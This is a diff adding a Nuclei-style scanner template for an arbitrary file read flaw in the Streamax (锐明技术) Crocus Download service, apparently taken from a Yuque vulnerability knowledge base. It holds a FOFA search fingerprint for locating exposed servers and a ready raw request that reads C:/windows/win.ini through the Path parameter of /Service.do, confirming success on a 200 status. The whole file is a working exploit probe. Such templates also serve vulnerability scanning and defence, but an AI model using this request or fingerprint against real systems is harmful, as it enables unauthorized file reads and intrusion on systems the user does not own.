@@ -1,0 +1,23 @@
+id: poc-ucainthwf41y8dga
+info:
+  name: 锐明技术Crocus-Download-任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ucainthwf41y8dga'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ucainthwf41y8dga
+    fofa: body="inp_verification"
+http:
+- raw:
+  - 'GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
